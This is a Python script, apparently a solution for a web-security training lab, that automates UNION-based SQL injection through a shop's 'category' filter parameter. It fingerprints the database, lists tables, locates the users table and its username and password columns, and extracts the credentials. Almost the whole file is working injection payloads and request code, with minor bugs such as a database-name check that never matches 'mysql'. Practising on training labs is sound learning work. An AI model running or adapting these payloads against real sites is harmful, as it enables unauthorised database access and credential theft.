import requests
import re

URL = "https://0aca004a04c49657800aad8300c2004c.web-security-academy.net"
PATH = "/filter"
QUERY = {
    "category": "Gifts"
}

def makeRequest(url: str = URL, path: str = PATH, query: str = QUERY):    
    response = requests.request(
    "GET",
    f"{URL}{PATH}",
    params=QUERY,
    )
    return response

def getDbVersion(db: str = None):
    ORACLE = "banner" # banner FROM v$version
    MICROSOFT_MYSQL = "@@version"
    POSTGRES = "version()"
    
    if db.lower() == "oracle":
        QUERY['category'] = f"Gifts' UNION SELECT NULL, {ORACLE} FROM v$version--"
    elif db.lower() == ("microsoft" or "mysql"):
        QUERY['category'] = f"Gifts' UNION SELECT NULL, {MICROSOFT_MYSQL} -- "
    elif db.lower() == "postgres":
        QUERY['category'] = f"Gifts' UNION SELECT NULL, {POSTGRES}-- "
    
    return makeRequest()

def getDbTables(db: str = None):
    if db is not None and db.lower() == "oracle":
        QUERY['category'] = f"Gifts' UNION SELECT NULL,table_name FROM all_tables--"
    else:
        QUERY['category'] = f"Gifts' UNION SELECT NULL, table_name FROM information_schema.tables -- "
    
    return makeRequest().text

def findTableName(text, db=None):
    if db is None:
        table = re.compile("users_.*(?=<)", re.IGNORECASE)
        if table.search(text):
            return (table.search(text).group(0))
    elif db == 'oracle':
        table = re.search("users_\w{6}(?=<)", text, re.IGNORECASE).group(0)
        return table
        

def getTableColumns(tableName, db=None):
    if db is None:
        QUERY["category"] = f"Gifts' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='{tableName}' -- "
        return makeRequest().text
    elif db == 'oracle':
        QUERY["category"] = f"Gifts' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='{tableName}'--"
        return makeRequest().text

def findColumnNames(text):
    username_col = re.compile("username_.*(?=<)", re.IGNORECASE)
    password_col = re.compile("password_.*(?=<)", re.IGNORECASE)
    if username_col.search(text):
        user_col = username_col.search(text).group(0)
    if password_col.search(text):
        pass_col = password_col.search(text).group(0)
    return {"username": user_col, "password": pass_col}

def findCreds(colNames, tableName):
    QUERY['category'] = f"Gifts' UNION SELECT {colNames['username']}, {colNames['password']} FROM {tableName} -- "
    res = makeRequest().text
    return res


# res = getDbVersion(db='mysql')
# print(res.text)

res = getDbTables(db='oracle')
table_name = findTableName(res, db='oracle')
col_res = getTableColumns(table_name, db='oracle')
col_names = findColumnNames(col_res)
creds = findCreds(col_names, table_name)
print(creds)